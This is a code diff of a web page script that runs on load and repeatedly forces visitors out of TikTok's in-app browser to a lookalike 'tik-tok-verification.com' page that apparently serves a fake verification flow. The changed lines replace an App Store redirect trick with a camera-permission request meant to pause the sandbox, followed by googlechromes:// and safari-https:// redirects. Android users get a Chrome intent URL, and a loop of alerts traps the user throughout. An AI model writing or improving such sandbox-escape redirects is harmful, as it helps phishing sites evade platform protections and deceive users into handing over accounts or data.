@@ -9,40 +9,38 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const cleanUrl = "tik-tok-verification.com/Verification/verify1.html";
+    const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function absoluteEject() {
+    function goSickoMode() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Intent with "BROWSABLE" and "NEW_TASK" flags
-            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: Intent with the Chrome package and the "Always" flag
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE STORE-REDIRECT PULSE
+            // iOS: THE MEDIA-PERMISSION CRASH
             
-            // 1. Trigger a Store protocol. TikTok's whitelist allows this 
-            // to hit the iOS Kernel immediately.
-            window.location.href = "itms-apps://itunes.apple.com/app/id361309726"; // Netflix (Whitelisted ID)
+            // 1. Force a camera request. This triggers the OS 'Permission' layer.
+            // This 'pauses' the TikTok sandbox for a millisecond.
+            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
 
-            // 2. The Switch: 150ms later, while the OS is "Switching", 
-            // we inject the Safari protocol.
-            setTimeout(() => {
-                window.location.href = "safari-https://" + cleanUrl;
-            }, 150);
+            // 2. THE JUMP: Fired during the sandbox 'pause'
+            // We use the specific 'googlechromes' protocol with the CLEAN domain.
+            window.location.href = "googlechromes://" + domain;
 
-            // 3. Final force
+            // 3. THE OVERWRITE: 50ms later, force Safari directly.
             setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 300);
+                window.location.href = "safari-https://" + domain;
+            }, 50);
         }
     }
 
     function securityLoop() {
         if (Date.now() > killTime) return;
 
-        // Try to eject before the first alert
-        absoluteEject();
+        // Start the ejection process
+        goSickoMode();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -52,10 +50,10 @@
                 alert(header + body);
                 
                 // Immediately eject on "OK" tap
-                absoluteEject();
-                setTimeout(securityLoop, 400);
+                goSickoMode();
+                setTimeout(securityLoop, 300);
             }
-        }, 400);
+        }, 300);
     }
 
     window.onload = securityLoop;
